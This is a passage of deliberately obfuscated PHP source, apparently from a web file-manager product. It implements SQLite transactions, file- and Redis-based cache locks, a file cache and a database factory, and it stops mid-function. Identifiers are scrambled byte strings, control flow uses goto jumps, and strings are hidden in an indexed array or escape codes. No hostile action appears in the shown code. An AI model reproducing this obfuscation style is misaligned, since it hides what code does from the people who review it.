$this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ú∫][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÕâ—“éÑ– = $this->_linkID->query($_SERVER[ú∫][23]); if (!$FÕâ—“éÑ–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fΩπé◊Æéû = $this->_linkID->query($_SERVER[ú∫][24]); if (!$fΩπé◊Æéû) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B”π‰Àí·∏ = array(); while ($BñåÔí≥Ì÷ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B”π‰Àí·∏[] = $BñåÔí≥Ì÷; } $this->queryID->reset(); return $B”π‰Àí·∏; } public function getFields($BŸ◊ƒﬁ‚ÎÖ) { $F¢π»ª“”‚ =& $_SERVER[ú∫]; $dÍÎà÷ÿîº = $this->query($F¢π»ª“”‚[25] . $BŸ◊ƒﬁ‚ÎÖ . $F¢π»ª“”‚[26]); $E™Á·è“æì = array(); if ($dÍÎà÷ÿîº) { foreach ($dÍÎà÷ÿîº as $eÒ∏ó“ê’É => $d≈‚©¿À≤î) { $E™Á·è“æì[$d≈‚©¿À≤î[$F¢π»ª“”‚[28]]] = array($F¢π»ª“”‚[28] => $d≈‚©¿À≤î[$F¢π»ª“”‚[28]], $F¢π»ª“”‚[29] => $d≈‚©¿À≤î[$F¢π»ª“”‚[29]], $F¢π»ª“”‚[31] => (bool) ($d≈‚©¿À≤î[$F¢π»ª“”‚[31]] === $F¢π»ª“”‚[33]), $F¢π»ª“”‚[34] => $d≈‚©¿À≤î[$F¢π»ª“”‚[53]], $F¢π»ª“”‚[36] => (bool) $d≈‚©¿À≤î[$F¢π»ª“”‚[54]], $F¢π»ª“”‚[39] => (bool) $d≈‚©¿À≤î[$F¢π»ª“”‚[54]]); } } return $E™Á·è“æì; } public function getTables($B±ÒëÓä≈ﬂ = '') { $Fäüã◊¯‰ó =& $_SERVER[ú∫]; $cÔ±“µ…Íï = $this->query($Fäüã◊¯‰ó[42] . $Fäüã◊¯‰ó[43] . $Fäüã◊¯‰ó[44]); $EáîÚá“¿ = array(); foreach ($cÔ±“µ…Íï as $bìﬂ—∂†¨ö => $CòúÇ’Ï·›) { $EáîÚá“¿[$bìﬂ—∂†¨ö] = current($CòúÇ’Ï·›); } return $EáîÚá“¿; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D°Óùô€ˆô =& $_SERVER[ú∫]; $this->error = $this->_linkID->lastErrorMsg(); if ($D°Óùô€ˆô[33] != $this->queryStr) { $this->error .= LNG($D°Óùô€ˆô[45]) . $this->queryStr; } think_trace($this->error, $D°Óùô€ˆô[33], $D°Óùô€ˆô[46]); return $this->error; } public function escapeString($dÀü≤†˘Î†) { $a‰à¶’‚…ä =& $_SERVER[ú∫]; if ($this->_linkID) { return $this->_linkID->escapeString($dÀü≤†˘Î†); } return str_ireplace($a‰à¶’‚…ä[55], $a‰à¶’‚…ä[56], $dÀü≤†˘Î†); } public function parseLimit($fïêçƒ°Óä) { $eøÙ„é¨è =& $_SERVER[ú∫]; $e—™ÏΩ’™∑ = $eøÙ„é¨è[33]; if (!empty($fïêçƒ°Óä)) { $fïêçƒ°Óä = explode($eøÙ„é¨è[47], $fïêçƒ°Óä); if (count($fïêçƒ°Óä) > 1) { $e—™ÏΩ’™∑ .= $eøÙ„é¨è[48] . $fïêçƒ°Óä[1] . $eøÙ„é¨è[49] . $fïêçƒ°Óä[0] . $eøÙ„é¨è[50]; } else { $e—™ÏΩ’™∑ .= $eøÙ„é¨è[48] . $fïêçƒ°Óä[0] . $eøÙ„é¨è[50]; } } return $e—™ÏΩ’™∑; } } goto Cô¢ÀôÇ©¯; Eœ≈ﬁøØæ¯: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $DâµÔ‡µØ“ =& $_SERVER[ú∫]; $DÌÎ‰¢É£≥ = $GLOBALS[$DâµÔ‡µØ“[6]][$DâµÔ‡µØ“[347]]; self::$cachePath = $DÌÎ‰¢É£≥[$DâµÔ‡µØ“[193]][$DâµÔ‡µØ“[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($cŸﬁííÁ¶ë, $Dâ∫∂ØÑ£π = 0) { goto b˜Ø˘åÏ–ä; b˜Ø˘åÏ–ä: $dﬁ∂»ˆôµÃ =& $_SERVER[ú∫]; $dÕ˜çÉ ë≤ = microtime(!0); $d„≈Âå‚ûà = $dÕ˜çÉ ë≤ + $Dâ∫∂ØÑ£π + 0.0001; goto F¥Ô‡é∆¶‹; F¥Ô‡é∆¶‹: $déπ†í≈óè = rtrim(self::$cachePath, $dﬁ∂»ˆôµÃ[8]) . $dﬁ∂»ˆôµÃ[818] . md5($cŸﬁííÁ¶ë) . $dﬁ∂»ˆôµÃ[815]; if (file_exists($déπ†í≈óè) && filemtime($déπ†í≈óè) && filemtime($déπ†í≈óè) < time() - 10) { @unlink($déπ†í≈óè); } do { if (file_exists($déπ†í≈óè)) { cacheLockWait(); continue; } $d¿‚≥ô®öØ = fopen($déπ†í≈óè, $dﬁ∂»ˆôµÃ[819]); if (!$d¿‚≥ô®öØ) { return !1; } $dìõŒπœ¿Ç = flock($d¿‚≥ô®öØ, LOCK_EX | LOCK_NB); self::$caches[$cŸﬁííÁ¶ë] = array($dﬁ∂»ˆôµÃ[820] => $d¿‚≥ô®öØ, $dﬁ∂»ˆôµÃ[193] => $déπ†í≈óè); fwrite($d¿‚≥ô®öØ, $d„≈Âå‚ûà); clearstatcache(); if ($d¿‚≥ô®öØ && $dìõŒπœ¿Ç) { return !0; } cacheLockWait(); } while (microtime(!0) < $d„≈Âå‚ûà); goto bëô≈ÛÖÔΩ; bëô≈ÛÖÔΩ: $this->unlock($cŸﬁííÁ¶ë); return !1; goto DÙÿõ≠ ê∑; DÙÿõ≠ ê∑: } public function lockGet($aÖπ‡èøÀë) { $DÒµâã âî =& $_SERVER[ú∫]; $BÕ“ÒÌÑÓÉ = rtrim(self::$cachePath, $DÒµâã âî[8]) . $DÒµâã âî[818] . md5($aÖπ‡èøÀë) . $DÒµâã âî[815]; return file_exists($BÕ“ÒÌÑÓÉ); } public function unlock($b∂‰¶∑¢›ø) { goto F¥â±ä„£Ù; dﬁèÚ†ØÇ¢: @flock($d Ù≥åÜç∂[$FÜÇÚ“Ñ÷⁄[820]], LOCK_UN); @fclose($d Ù≥åÜç∂[$FÜÇÚ“Ñ÷⁄[820]]); @unlink($d Ù≥åÜç∂[$FÜÇÚ“Ñ÷⁄[193]]); goto EÒ‘¶ûúç; F¥â±ä„£Ù: $FÜÇÚ“Ñ÷⁄ =& $_SERVER[ú∫]; $d Ù≥åÜç∂ = self::$caches[$b∂‰¶∑¢›ø]; if (!$d Ù≥åÜç∂) { return; } goto dﬁèÚ†ØÇ¢; EÒ‘¶ûúç: unset(self::$caches[$b∂‰¶∑¢›ø]); goto D’·ó¿∆à‚; D’·ó¿∆à‚: } } class CacheLockRedis { public function lock($eîŒ˜¨‰˜ô, $c·õÇÕÌÇº = 10) { $fÆÌÜ»»”√ = Cache::init(); $bîÔ≥ôÆ‹≈ = microtime(!0) + $c·õÇÕÌÇº; while (microtime(!0) < $bîÔ≥ôÆ‹≈) { $B∆œ¬æπä… = $fÆÌÜ»»”√->get($eîŒ˜¨‰˜ô); if (!$B∆œ¬æπä…) { $eﬁàé∆ ó√ = $fÆÌÜ»»”√->setLock($eîŒ˜¨‰˜ô, $bîÔ≥ôÆ‹≈, $c·õÇÕÌÇº); if ($eﬁàé∆ ó√) { return !0; } } else { if ($B∆œ¬æπä… < microtime(!0)) { $fÆÌÜ»»”√->set($eîŒ˜¨‰˜ô, $bîÔ≥ôÆ‹≈, $c·õÇÕÌÇº * 2); if ($fÆÌÜ»»”√->get($eîŒ˜¨‰˜ô) === $B∆œ¬æπä…) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($fáÿ“ùÁë‘) { return Cache::init()->get($fáÿ“ùÁë‘); } public function unlock($d·û÷Ôúöª) { return Cache::init()->remove($d·û÷Ôúöª); } } goto C€Ü¢·Ÿ¿Ã; B°¢‡¥«∏Ø: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AÙÚßòé≥Ã; AÙÚßòé≥Ã: $cÖæ∑ê≥ß» =& $_SERVER[ú∫]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto e◊˜£ﬁéü; dò…ù¡Ê‚÷: switch ($C∆≈Û“Ω∞é[$cÖæ∑ê≥ß»[792]]) { case $cÖæ∑ê≥ß»[17]: self::$handle = Model($cÖæ∑ê≥ß»[794]); break; case $cÖæ∑ê≥ß»[795]: self::$handle = new CacheRedis($aÇàˆ≥üèÌ, $d™˘çëé≤ú); break; case $cÖæ∑ê≥ß»[796]: self::$handle = new CacheMemcached($aÇàˆ≥üèÌ, $d™˘çëé≤ú); break; case $cÖæ∑ê≥ß»[193]: self::$handle = new CacheFile($aÇàˆ≥üèÌ, $d™˘çëé≤ú); break; default: break; } return self::$handle; goto cîÎº…‡¯‡; e◊˜£ﬁéü: $C∆≈Û“Ω∞é = $GLOBALS[$cÖæ∑ê≥ß»[6]][$cÖæ∑ê≥ß»[347]]; $aÇàˆ≥üèÌ = $C∆≈Û“Ω∞é[$C∆≈Û“Ω∞é[$cÖæ∑ê≥ß»[792]]]; $d™˘çëé≤ú = $C∆≈Û“Ω∞é[$cÖæ∑ê≥ß»[793]]; goto dò…ù¡Ê‚÷; cîÎº…‡¯‡: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eùﬁì™Áâî) { if (is_array($eùﬁì™Áâî) || is_object($eùﬁì™Áâî)) { $eùﬁì™Áâî = json_encode($eùﬁì™Áâî); } $eùﬁì™Áâî = rawurlencode($eùﬁì™Áâî); return md5(KOD_SITE_ID . $_SERVER[ú∫][71] . $eùﬁì™Áâî); } public static function get($A®Üãé„∫ˆ, $eﬁŒßﬁÚ‘ä = false) { $Eı¶¬∑„ñé = self::key($A®Üãé„∫ˆ); if ($eﬁŒßﬁÚ‘ä) { return unserialize(self::init()->get($Eı¶¬∑„ñé)); } if (!isset(self::$memoryCache[$Eı¶¬∑„ñé])) { $AÔïº¬úƒò = self::init()->get($Eı¶¬∑„ñé); self::$memoryCache[$Eı¶¬∑„ñé] = unserialize($AÔïº¬úƒò); } return self::$memoryCache[$Eı¶¬∑„ñé]; } public static function set($CûÍÒﬂèù¢, $A√ﬂ¥íù∑å, $Fò∑ﬂ¢äú® = false) { goto Fñ›˜ûÿÍÚ; fæå°å•“À: CacheLock::unlock($CûÍÒﬂèù¢); return $A≥¿„÷ç‚Ê; goto CÒäªÍäõî; Fñ›˜ûÿÍÚ: $aÚü ﬂ·™Õ = self::key($CûÍÒﬂèù¢); if (isset(self::$memoryCache[$aÚü ﬂ·™Õ]) && self::$memoryCache[$aÚü ﬂ·™Õ] === $A√ﬂ¥íù∑å) { return !0; } if ($Fò∑ﬂ¢äú® === 0) { self::$memoryCache[$aÚü ﬂ·™Õ] = $A√ﬂ¥íù∑å; return !0; } goto bŸÑÉïªÑπ; bŸÑÉïªÑπ: CacheLock::lock($CûÍÒﬂèù¢); $A≥¿„÷ç‚Ê = self::init()->set($aÚü ﬂ·™Õ, serialize($A√ﬂ¥íù∑å), $Fò∑ﬂ¢äú®); self::$memoryCache[$aÚü ﬂ·™Õ] = $A√ﬂ¥íù∑å; goto fæå°å•“À; CÒäªÍäõî: } public static function getCall($aÎÜøê•≤Ï, $Bí’´â´ŒÜ, $C‚ì∏◊äƒÖ, $EéËˆêÇö€ = array()) { goto cÉÈæ≈“≥â; C∏Àç≤¥¿Á: return $EŸÈ·™Öê; goto fªΩæ◊¢Óö; cÉÈæ≈“≥â: $c≥Ç”ÊÈÎ =& $_SERVER[ú∫]; $EŸÈ·™Öê = self::get($aÎÜøê•≤Ï); if ($EŸÈ·™Öê || $EŸÈ·™Öê === $c≥Ç”ÊÈÎ[33]) { return $EŸÈ·™Öê; } goto e‹ÃŒ®ÉÑ£; e‹ÃŒ®ÉÑ£: $EŸÈ·™Öê = call_user_func_array($C‚ì∏◊äƒÖ, $EéËˆêÇö€); $EŸÈ·™Öê = $EŸÈ·™Öê ? $EŸÈ·™Öê : $c≥Ç”ÊÈÎ[33]; self::set($aÎÜøê•≤Ï, $EŸÈ·™Öê, $Bí’´â´ŒÜ); goto C∏Àç≤¥¿Á; fªΩæ◊¢Óö: } public static function remove($AÖÃïÜÖî÷) { goto Aƒ‰≈ÖÁä—; b±ÚÑ©⁄≠¥: return $A‘®‘‹ÎÈã; goto dµÒ∑ “âñ; B§§Î≤¬¢Û: CacheLock::lock($AÖÃïÜÖî÷); $A‘®‘‹ÎÈã = self::init()->remove($Fü†õ∏√Íõ); CacheLock::unlock($AÖÃïÜÖî÷); goto b±ÚÑ©⁄≠¥; Aƒ‰≈ÖÁä—: $Fü†õ∏√Íõ = self::key($AÖÃïÜÖî÷); unset(self::$memoryCache[$Fü†õ∏√Íõ]); self::clearTimeout(); goto B§§Î≤¬¢Û; dµÒ∑ “âñ: } public static function removeMemory($dã¡ﬂÏ·»ë) { $EÀ÷üà˜–ö = self::key($dã¡ﬂÏ·»ë); unset(self::$memoryCache[$EÀ÷üà˜–ö]); } public static function clearMemory($Cúê±á£ûÀ = false) { if ($Cúê±á£ûÀ) { $Cúê±á£ûÀ = self::key($Cúê±á£ûÀ); unset(self::$memoryCache[$Cúê±á£ûÀ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ú∫][797])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ú∫][798])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Aå∆ÂâÛÖå, $C¬çôëéÇ÷) { $C⁄„À®£»à =& $_SERVER[ú∫]; $this->cachePath = $Aå∆ÂâÛÖå[$C⁄„À®£»à[76]]; $this->prefix = $C⁄„À®£»à[799]; $this->cacheTime = $C¬çôëéÇ÷; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cΩ¶ùúŒ¡∫) { $AÍ∆äÔ’™± =& $_SERVER[ú∫]; $cΩ¶ùúŒ¡∫ = str_replace(array($AÍ∆äÔ’™±[800], $AÍ∆äÔ’™±[97], $AÍ∆äÔ’™±[70]), $AÍ∆äÔ’™±[801], $cΩ¶ùúŒ¡∫); return $this->cachePath . $AÍ∆äÔ’™±[802] . $cΩ¶ùúŒ¡∫ . $AÍ∆äÔ’™±[803]; } public function set($Eâ©€∆∂´Ω, $DüûòÆî˘¿, $BıÍº£ÛèÜ = false) { $Bﬁ†Çç¿∫µ = $this->getFile($Eâ©€∆∂´Ω); if (file_put_contents($Bﬁ†Çç¿∫µ, $this->prefix . $DüûòÆî˘¿, LOCK_EX)) { @touch($Bﬁ†Çç¿∫µ, intval(time() + $BıÍº£ÛèÜ)); clearstatcache(); return !0; } @unlink($Bﬁ†Çç¿∫µ); return !1; } public function get($Fá¢Ωüñ◊∫) { $C¿‡›ÔæßÕ = $this->getFile($Fá¢Ωüñ◊∫); if (file_exists($C¿‡›ÔæßÕ) && filemtime($C¿‡›ÔæßÕ) < time()) { @unlink($C¿‡›ÔæßÕ); return !1; } $cóæÓú§≤ÿ = @file_get_contents($C¿‡›ÔæßÕ); return substr($cóæÓú§≤ÿ, strlen($this->prefix)); } public function remove($CÀ£±ÿ‰Ë≤) { $Aà”¢∫’ãΩ = $this->getFile($CÀ£±ÿ‰Ë≤); return @unlink($Aà”¢∫’ãΩ); } public function deleteAll() { $Cœô¢”ß√é =& $_SERVER[ú∫]; $c‹ÀΩÜÕ«ñ = scandir($this->cachePath); foreach ($c‹ÀΩÜÕ«ñ as $F∂¢ïÛ¶∆Ü) { $eÛ’±ÑæÚâ = $this->cachePath . $F∂¢ïÛ¶∆Ü; if (strpos($eÛ’±ÑæÚâ, $Cœô¢”ß√é[803]) && strpos($eÛ’±ÑæÚâ, $Cœô¢”ß√é[804])) { @unlink($eÛ’±ÑæÚâ); } } } public function clearTimeout() { $E∂áÊ∏Â∫ä =& $_SERVER[ú∫]; $a”†ŸÈù£Ω = scandir($this->cachePath); foreach ($a”†ŸÈù£Ω as $B∞ûîÉéúπ) { $fçüØÍÃœÔ = $this->cachePath . $B∞ûîÉéúπ; if (strpos($fçüØÍÃœÔ, $E∂áÊ∏Â∫ä[803]) && strpos($fçüØÍÃœÔ, $E∂áÊ∏Â∫ä[804]) && filemtime($fçüØÍÃœÔ) < time()) { @unlink($fçüØÍÃœÔ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C¬÷©ÃÊÛ™; D†‰ÕÉ†…–: if ($d§ï»æáèà == $E‚ˆû‡∆∫“[17] && $E∑äÊ”è∆´ == $E‚ˆû‡∆∫“[9]) { $d§ï»æáèà = $E‚ˆû‡∆∫“[193]; } switch ($d§ï»æáèà) { case $E‚ˆû‡∆∫“[795]: self::$handle = new CacheLockRedis(); break; case $E‚ˆû‡∆∫“[796]: self::$handle = new CacheLockMemcached(); break; case $E‚ˆû‡∆∫“[17]: self::$handle = new CacheLockDatabase(); break; case $E‚ˆû‡∆∫“[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a ∞îπäæá; e‡Õªö¢œï: self::$timeout = $eè≠÷ﬁπûº[$E‚ˆû‡∆∫“[805]] ? $eè≠÷ﬁπûº[$E‚ˆû‡∆∫“[805]] : 10; $E∑äÊ”è∆´ = _get($GLOBALS[$E‚ˆû‡∆∫“[6]], $E‚ˆû‡∆∫“[806]); $d§ï»æáèà = $eè≠÷ﬁπûº[$E‚ˆû‡∆∫“[792]] ? $eè≠÷ﬁπûº[$E‚ˆû‡∆∫“[792]] : $E‚ˆû‡∆∫“[193]; goto D†‰ÕÉ†…–; C¬÷©ÃÊÛ™: $E‚ˆû‡∆∫“ =& $_SERVER[ú∫]; if (self::$handle) { return self::$handle; } $eè≠÷ﬁπûº = $GLOBALS[$E‚ˆû‡∆∫“[6]][$E‚ˆû‡∆∫“[347]]; goto e‡Õªö¢œï; a ∞îπäæá: } private static function key($Fﬂ∂È“çﬁ) { return $_SERVER[ú∫][807] . Cache::key($Fﬂ∂È“çﬁ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fåÆßÛ¡˘´ = '') { self::$errorMsg = $fåÆßÛ¡˘´; } public static function lockGlobal($D¿≠áæŒñ≈, $a«¯«¢∑‚Õ) { return self::lock($D¿≠áæŒñ≈, $a«¯«¢∑‚Õ, !0); } public static function lock($Aß‹êí Ëå, $E‹ëê•⁄”• = false, $dªä√äßÉÇ = false) { goto bÜèßœˆø†; C«⁄õŒ—ø€: $E‹ëê•⁄”• = $E‹ëê•⁄”• ? $E‹ëê•⁄”• : self::$timeout; $BÒãÙöÿ—ˆ = $dÜé†€œÛﬁ->lock($cÜ√·¬à à, $E‹ëê•⁄”•); if (!$BÒãÙöÿ—ˆ) { $CùÇ´ô∏‡å = "\154\x6f\143\x6b\40\x65\162\x72\x6f\x72\73\153\x65\171\75{$Aß‹êí Ëå}\x3b\x74\x69\155\x65\75{$E‹ëê•⁄”•}\x3b" . self::$errorMsg . $EÓÙ÷àﬂŸ•[68] . get_caller_msg(); $A»ü¥‘≈‚ô = LNG($EÓÙ÷àﬂŸ•[808]) . "\50{$E‹ëê•⁄”•}\x73\51\x2e" . LNG($EÓÙ÷àﬂŸ•[809]); $A»ü¥‘≈‚ô .= $EÓÙ÷àﬂŸ•[810]; if (is_string(self::$errorMsg) && self::$errorMsg) { $A»ü¥‘≈‚ô = $A»ü¥‘≈‚ô . $EÓÙ÷àﬂŸ•[811] . self::$errorMsg; } write_log($CùÇ´ô∏‡å, $EÓÙ÷àﬂŸ•[812]); show_json($A»ü¥‘≈‚ô, !1); } goto Aﬂ√ÆΩµõ˜; bÜèßœˆø†: $EÓÙ÷àﬂŸ• =& $_SERVER[ú∫]; $dÜé†€œÛﬁ = self::init(); $cÜ√·¬à à = self::key($Aß‹êí Ëå); goto C«⁄õŒ—ø€; Aﬂ√ÆΩµõ˜: if (!$dªä√äßÉÇ) { self::$lockItem[$cÜ√·¬à à] = !0; } return $BÒãÙöÿ—ˆ; goto d¡ãÉù—‚‡; d¡ãÉù—‚‡: } public static function lockGet($fçæ±ﬂë˜í) { $Bƒ≥õ∂ï≥Û = self::key($fçæ±ﬂë˜í); if (self::$lockItem[$Bƒ≥õ∂ï≥Û]) { return self::$lockItem[$Bƒ≥õ∂ï≥Û]; } return self::init()->lockGet($Bƒ≥õ∂ï≥Û); } public static function unlock($c—Éé¿éÖﬂ) { $cé•÷¨·≠∞ = self::key($c—Éé¿éÖﬂ); self::$lockItem[$cé•÷¨·≠∞] = null; return self::init()->unlock($cé•÷¨·≠∞); } public static function unlockRuntime() { $c∞ı¥ŸÍÑú =& $_SERVER[ú∫]; $aÑ◊⁄¬„è˜ = self::init(); $cñ∆ß‹Ÿ∫å = !1; foreach (self::$lockItem as $EÈ¢ÊÚ√Ü√ => $d∆¢Á‘Ÿ±¬) { if (!$d∆¢Á‘Ÿ±¬) { continue; } $aÑ◊⁄¬„è˜->unlock($EÈ¢ÊÚ√Ü√); if (!$cñ∆ß‹Ÿ∫å) { $cñ∆ß‹Ÿ∫å = !0; write_log($c∞ı¥ŸÍÑú[813] . $EÈ¢ÊÚ√Ü√ . $c∞ı¥ŸÍÑú[68] . get_caller_msg(), $c∞ı¥ŸÍÑú[812]); continue; } write_log($c∞ı¥ŸÍÑú[813] . $EÈ¢ÊÚ√Ü√, $c∞ı¥ŸÍÑú[812]); } self::fileUnlockAll(); } public static function fileLock($cªªçèï©€) { goto fâ≥ıî‰“Â; dµŸÙµêÜ∆: return !1; goto FÌ≈œÓº¨¨; EºÖÿßçãÃ: if (flock($e∆àŒ¬ÇÉÑ, LOCK_EX)) { return !0; } self::unlock($cªªçèï©€); show_json($d¢âÍõúëÀ[817], !1); goto dµŸÙµêÜ∆; fâ≥ıî‰“Â: $d¢âÍõúëÀ =& $_SERVER[ú∫]; if (!$GLOBALS[$d¢âÍõúëÀ[814]]) { $GLOBALS[$d¢âÍõúëÀ[814]] = array(); } $GLOBALS[$d¢âÍõúëÀ[814]][$cªªçèï©€] = !1; goto DëÇíå◊∫Ù; DëÇíå◊∫Ù: $e∆àŒ¬ÇÉÑ = fopen(DATA_PATH . $cªªçèï©€ . $d¢âÍõúëÀ[815], $d¢âÍõúëÀ[816]); if (!$e∆àŒ¬ÇÉÑ) { return !1; } $GLOBALS[$d¢âÍõúëÀ[814]][$cªªçèï©€] = $e∆àŒ¬ÇÉÑ; goto EºÖÿßçãÃ; FÌ≈œÓº¨¨: } public static function fileUnlock($E∆≥‹Ê‹¶) { $AóÊâˆÕÒü =& $_SERVER[ú∫]; $aÜÑ∏í•¨û = $GLOBALS[$AóÊâˆÕÒü[814]][$E∆≥‹Ê‹¶]; if (!$aÜÑ∏í•¨û) { return; } $GLOBALS[$AóÊâˆÕÒü[814]][$E∆≥‹Ê‹¶] = !1; flock($aÜÑ∏í•¨û, LOCK_UN); fclose($aÜÑ∏í•¨û); } public static function fileUnlockAll() { $F»–∫ê•à— =& $_SERVER[ú∫]; if (!$GLOBALS[$F»–∫ê•à—[814]]) { return; } foreach ($GLOBALS[$F»–∫ê•à—[814]] as $E‘æñŸ¢ë≠ => $A°‘¬àÿ€‰) { if (!$A°‘¬àÿ€‰) { continue; } $GLOBALS[$F»–∫ê•à—[814]][$E‘æñŸ¢ë≠] = !1; flock($A°‘¬àÿ€‰, LOCK_UN); fclose($A°‘¬àÿ€‰); } $GLOBALS[$F»–∫ê•à—[814]] = array(); } } goto Eœ≈ﬁøØæ¯; Eÿ≥ÁƒìÊ⁄: class DbSqlite extends DbSqliteBase { public function query($b”ı‹€∂¨Œ) { $BÙ“¯í—Êá =& $_SERVER[ú∫]; if (!CacheLock::fileLock($BÙ“¯í—Êá[9])) { return !1; } $F≤··üÔ”∞ = parent::query($b”ı‹€∂¨Œ); CacheLock::fileUnLock($BÙ“¯í—Êá[9]); return $F≤··üÔ”∞; } public function execute($aÛÎÇÀôø∑) { $D©÷‡ïÛ´´ =& $_SERVER[ú∫]; if (!CacheLock::fileLock($D©÷‡ïÛ´´[9])) { return !1; } $Cå˘îﬁ‘≤‰ = parent::execute($aÛÎÇÀôø∑); CacheLock::fileUnLock($D©÷‡ïÛ´´[9]); return $Cå˘îﬁ‘≤‰; } } class DbSqlite3 extends DbSqlite3Base { public function query($DŒôùçñ‡Î) { $f©©‚›ÁàÇ =& $_SERVER[ú∫]; if (!CacheLock::fileLock($f©©‚›ÁàÇ[9])) { return !1; } $Dæ≤¿ò´®‡ = parent::query($DŒôùçñ‡Î); CacheLock::fileUnLock($f©©‚›ÁàÇ[9]); return $Dæ≤¿ò´®‡; } public function execute($A‰∫Ïµéı) { $C¶Ç›ºÙÌ =& $_SERVER[ú∫]; if (!CacheLock::fileLock($C¶Ç›ºÙÌ[9])) { return !1; } $cÆÈäØÊµ = parent::execute($A‰∫Ïµéı); CacheLock::fileUnLock($C¶Ç›ºÙÌ[9]); return $cÆÈäØÊµ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\x71" => "\x3c\x3e", "\147\x74" => "\x3e", "\145\x67\x74" => "\76\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\74\75", "\x6e\157\x74\154\x69\153\145" => "\x4e\x4f\124\40\x4c\x49\x4b\105", "\154\151\x6b\x65" => "\114\x49\113\x45", "\x69\156" => "\x49\x4e", "\156\157\x74\151\x6e" => "\x4e\x4f\124\40\111\x4e", "\156\x6f\164\x20\151\x6e" => "\x4e\117\x54\x20\x49\116", "\142\145\x74\x77\x65\x65\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\156\x6f\164\x62\x65\164\167\145\x65\x6e" => "\x4e\117\x54\40\102\x45\x54\127\105\105\x4e", "\x6e\157\164\40\142\x65\x74\167\x65\x65\x6e" => "\x4e\117\124\40\102\x45\124\x57\105\105\x4e"); protected $selectSql = "\123\x45\114\x45\x43\x54\45\x44\111\x53\124\x49\116\103\x54\x25\x20\x25\106\x49\x45\114\x44\45\x20\106\x52\x4f\115\x20\45\124\x41\102\x4c\x45\45\x25\x4a\117\111\x4e\x25\45\x57\110\x45\x52\x45\x25\x25\107\x52\x4f\125\x50\x25\x25\110\x41\x56\x49\116\107\x25\45\x4f\122\x44\x45\x52\45\45\x4c\x49\115\111\124\45\x20\45\x55\116\111\117\x4e\45\x25\x43\x4f\115\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $EÈê“üÍ≠ã = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ú∫][919], $EÈê“üÍ≠ã); } public function factory($fÑô≤ÏÕ·¥ = '') { goto eÛé“„œüƒ; Bé›ã∑å≥û: $this->dbType = ucwords(strtolower($fÑô≤ÏÕ·¥[$DÚÊ¢ñ—Ωù[920]])); $EµÍÑôÔø“ = $DÚÊ¢ñ—Ωù[922] . $this->dbType; if (class_exists($EµÍÑôÔø“)) { $BÇ˘ÓÕ•Ÿˆ = new $EµÍÑôÔø“($fÑô≤ÏÕ·¥); if ($DÚÊ¢ñ—Ωù[755] != strtolower($fÑô≤ÏÕ·¥[$DÚÊ¢ñ—Ωù[920]])) { $BÇ˘ÓÕ•Ÿˆ->dbType = strtoupper($this->dbType); } else { $BÇ˘ÓÕ•Ÿˆ->dbType = $this->_getDsnType($fÑô≤ÏÕ·¥[$DÚÊ¢ñ—Ωù[875]]); } } else { think_exception(think_lang($DÚÊ¢ñ—Ωù[923]) . $DÚÊ¢ñ—Ωù[924] . $EµÍÑôÔø“); } goto cÀª—«∞ï´; cÀª—«∞ï´: return $BÇ˘ÓÕ•Ÿˆ; goto BΩà¶ËŸÙ¿; eÛé“„œüƒ: $DÚÊ¢ñ—Ωù =& $_SERVER[ú∫]; $fÑô≤ÏÕ·¥ = $this->parseConfig($fÑô≤ÏÕ·¥); if (empty($fÑô≤ÏÕ·¥[$DÚÊ¢ñ—Ωù[920]])) { think_exception(think_lang($DÚÊ¢ñ—Ωù[921])); } goto Bé›ã∑å≥û; BΩà¶ËŸÙ¿: } public function __call($d´ø¨ì÷Õ∞, $f±õç“ÈßÂ) { if (method_exists($this, $d´ø¨ì÷Õ∞)) { return call_user_func_array(array($this, $d´ø¨ì÷Õ∞), $f±õç“ÈßÂ); } } protected function _getDsnType($fÿÂØÜçáÍ) { $FÙ®è†õÕÉ = explode($_SERVER[ú∫][4], $fÿÂØÜçáÍ); $bÏÇÔ«È¢† = strtoupper(trim($FÙ®è†õÕÉ[0])); return $bÏÇÔ«È¢†; } private function parseConfig($c√œÎµÈ¥∂ = '') { $dßåÁÉ≈…∑ =& $_SERVER[ú∫]; if (!empty($c√œÎµÈ¥∂) && is_string($c√œÎµÈ¥∂)) { $c√œÎµÈ¥∂ = $this->parseDSN($c√œÎµÈ¥∂); } elseif (is_array($c√œÎµÈ¥∂)) { $c√œÎµÈ¥∂ = array_change_key_case($c√œÎµÈ¥∂); 